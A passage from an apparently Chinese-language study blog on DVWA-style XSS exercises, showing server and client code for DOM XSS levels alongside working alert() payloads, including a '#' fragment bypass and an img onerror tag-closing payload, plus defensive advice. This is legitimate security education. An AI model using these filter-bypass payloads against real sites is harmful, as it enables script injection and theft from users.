<span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>一样的<strong>Impossible</strong>是使用一个<strong>htmlspecialchars</strong>函数来过滤<strong>XSS</strong>攻击。</p>
<h3 id="dom型xss例题">DOM型XSS例题</h3>
<p><strong>DOM
XSS</strong>和前面的两种<strong>XSS</strong>的区别主要是：<strong>DOM
XSS</strong>的产生并没有和后台服务器产生交互，而是通过浏览器的<strong>DOM</strong>树解析产生的。</p>
<h4 id="low-2">Low</h4>
<h5 id="server-code-27">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><strong>JavaScript</strong>代码中可以看到<strong>default</strong>的值附加到<strong>url</strong>后，会被值赋给<strong>option</strong>标签的<strong>value</strong>属性，但也没有什么过滤。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?default=English<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="medium-2">Medium</h4>
<h5 id="server-code-28">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>前端的<strong>JavaScript</strong>和<strong>Low</strong>的一样。多了一个后端的<strong>PHP</strong>。</p>
这儿使用<strong>stripos</strong>函数匹配了**
<script>
<p><strong>标签，且</strong>stripos**函数防止大小写绕过，因此有二解。</p>
<p>一是在<strong>url</strong>链接中带上一个<strong>#</strong>注释，这样注释后的恶意代码就不会经过服务端更不谈什么过滤了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?default=English#<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>二是使用<strong>img</strong>的<strong>oneerror</strong>事件、<strong>svg</strong>的<strong>onload</strong>事件等去执行<strong>JavaScript</strong>代码。</p>
<p>不过这里还需要注意闭合前面的<strong><option>和<select></strong>标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="high-2">High</h4>
<h5 id="server-code-29">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这儿在服务器后端判断，要求<strong>default</strong>的值必须为<strong>select</strong>选择菜单中的值，继续用<strong>#</strong>注释即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?default=English#<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="impossible-2">Impossible</h4>
<p>就留下了一句话<strong>Don't need to do anything, protction handled on the client side</strong>【雾。</p>
<h3 id="总结">总结</h3>
<p>从以上做的这么多题目可以看到，现在主要的手段还是过滤，能被轻易绕过的都是不够完善的使用正则表达式进行的过滤，基本上说来一个<strong>htmlspecialchars</strong>函数就无解了，只需要对输入进行过滤，输出进行编码，配合使用黑白名单，基本就能防御绝大多数的<strong>XSS</strong>攻击。</p>
<p>有所不足，立下<strong>flag</strong>日后再做补充<strong>XD</strong>。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Web安全修炼计划</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
</search>
